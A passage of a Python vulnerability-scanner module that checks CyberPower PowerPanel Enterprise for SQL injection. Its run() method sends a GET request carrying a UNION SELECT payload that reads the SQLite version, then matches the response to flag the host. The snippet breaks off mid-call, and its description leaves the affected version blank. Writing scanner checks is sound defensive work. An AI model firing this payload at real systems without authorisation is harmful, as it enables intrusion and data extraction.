...
class Module(Scanner, Http_client):
    __info__ = {
        ...
        'description': 'A sql injection vulnerability exists in CyberPower PowerPanel Enterprise prior to .',
    ...
    def run(self):
        path = "/api/v1/confup?mode=&uid=1'%20UNION%20select%201,2,3,4,sqlite_version();--"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('"results":', '{"status":"finished',)
        ctype_any = ('application/json',)
        body_regexes = ('"code":"([0-9.]+)"',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(
                severity='high',
